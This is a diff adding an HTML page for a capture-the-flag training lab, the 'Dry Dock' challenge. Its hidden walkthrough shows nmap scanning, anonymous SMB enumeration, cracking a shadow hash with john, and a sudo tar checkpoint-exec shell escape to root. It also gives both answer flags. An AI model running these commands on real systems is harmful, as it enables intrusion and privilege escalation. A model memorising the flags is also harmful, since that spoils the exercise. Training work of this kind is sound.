@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Atlas Mission Control — Dry Dock</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 07</span><b>CHALLENGES</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 01</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Flags</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 2 flags accepted</small>
+        </div>
+      </aside>
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>CHALLENGE 01</span><i></i> NO QUESTION TRAIL</div>
+              <h1>DRY<br><em>DOCK</em></h1>
+              <p>A yard file node is in scope. The public page is a notice board. Map every service, recover a clerk, and take both flags. Atlas will not grade intermediate loot.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Open flag drop <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 45–70 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Lab map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>OPERATOR</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.130</span><small>FILE YARD</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>EDGE HOST</span><code data-target>10.23.54.130</code></div>
+              <div class="coordinate-row"><span>SCOPE</span><code>all services on this host</code></div>
+              <div class="coordinate-row"><span>ATLAS ACCEPTS</span><code>user + root flags</code></div>
+              <div class="scope-warning"><b>!</b><span>HTTP is a board, not the prize. Map 21, 22, 80, 139/445.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>Map every open port, not just 80</li>
+                <li><span>02</span>Read the file services — all of them</li>
+                <li><span>03</span>Crack a live hash and escalate</li>
+                <li><span>04</span>Submit user.txt and root.txt</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">N</span><span><b>Nmap</b><small>Full map, not top 1000 only</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">K</span><span><b>Kali toolkit</b><small>smbclient, john/hashcat, SSH</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">G</span><span><b>GTFOBins</b><small>When you have a shell</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">FLAG DROP</p>
+                <h2>Proof only.</h2>
+              </div>
+              <span id="cleared-copy">0/2 FLAGS</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / USER FLAG</strong></div>
+            <div class="intel-stat"><span>USER FLAG</span><strong id="intel-user">PENDING</strong></div>
+            <div class="intel-stat"><span>ROOT FLAG</span><strong id="intel-root">PENDING</strong></div>
+            <div class="intel-stat is-hidden"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>No stepwise questions. Atlas only checks the two flags.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview: public face at <a href="/site/">/site/</a>. Extra services are not in this preview.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>This is a challenge.</h2>
+            <p>The walkthrough names services, loot, and both flags. Submit user and root, or reveal if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to flag drop <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+          <div class="is-hidden" id="walkthrough-content">
+            
+            <div class="view-heading walkthrough-heading">
+              <div><p class="section-label">MISSION DEBRIEF</p><h2>Shares, then sunshine.</h2></div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+            <section class="debrief-summary"><div><span>01</span><p>MAP</p><b>21 22 80 445</b></div><i>→</i><div><span>02</span><p>SMB</p><b>hr-archive</b></div><i>→</i><div><span>03</span><p>CRACK</p><b>sunshine</b></div><i>→</i><div><span>04</span><p>SUDO</p><b>tar</b></div></section>
+            
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">MAP</p>
+                <h3>Four doors.</h3>
+                <p>nmap the host. HTTP is a board. FTP is a README. SMB is the yard. SSH waits for a password you do not have yet.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> nmap -sV -p- 10.23.54.130</div>
+                  <div class="terminal-output"><div class="hot">21/ftp  22/ssh  80/http  139,445/smb</div></div>
+                </div>
+                <figcaption><i>i</i>FTP README points at the shares.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">SMB</p>
+                <h3>Three shares.</h3>
+                <p>Guest list. public is canteen. scans is old nmap of the wrong box. hr-archive holds a shadow excerpt.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> smbclient -N -L //10.23.54.130</div>
+                  <div class="terminal-output"><div>public</div><div>scans</div><div class="hot">hr-archive</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">03</span>
+                <p class="section-label">CRACK</p>
+                <h3>m.holden is md5crypt.</h3>
+                <p>john or hashcat -m 500. s.admin is sha512 and is not the door. printer is junk. Password is sunshine.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> john --format=md5crypt shadow.excerpt --wordlist=/usr/share/wordlists/rockyou.txt</div>
+                  <div class="terminal-output"><div class="hot">m.holden:sunshine</div></div>
+                </div>
+                
+              </figure>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">04</span>
+                <p class="section-label">ROOT</p>
+                <h3>sudo tar.</h3>
+                <p>ssh m.holden, user.txt, sudo -l, GTFOBins tar.</p>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</div>
+                  <div class="terminal-output"><div class="flag">CH{dry_dock_root}</div></div>
+                </div>
+                <figcaption><i>i</i>User flag is CH{dry_dock_user}.</figcaption>
+              </figure>
+            </section>
+
+            <section class="completion-card">
+              <div><span>CHALLENGE</span><h3>Yard taken.</h3><p>Play the extra shares and decoys next time — they are part of the box.</p></div>
+              <div class="completion-stats">
+                <span><small>FLAGS</small><b id="completion-objectives">02 / 02</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This exposes the path and both flags. Debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>There is no hint ladder on this challenge — only this debrief.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
